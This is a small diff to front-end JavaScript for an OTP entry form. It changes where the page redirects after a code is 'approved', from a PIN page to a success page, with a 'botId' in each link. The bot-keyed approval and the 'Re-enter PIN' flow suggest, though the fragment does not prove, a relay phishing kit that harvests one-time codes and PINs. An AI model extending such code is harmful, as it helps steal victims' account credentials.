@@ -261,7 +261,7 @@ document.getElementById('otpForm').addEventListener('submit', async e=>{
   if(result.approved){
     // ✅ Approved (or "Code OK — Re-enter PIN") → go to pin.html
     setStatus("Code approved. Redirecting...", "success");
-    window.location.href = "pin.html?botId=" + botId;
+    window.location.href = "success.html?botId=" + botId;
   } else {
     setStatus("Incorrect OTP code. Please try again.", "error");
     inputs.forEach(i=>i.value="");
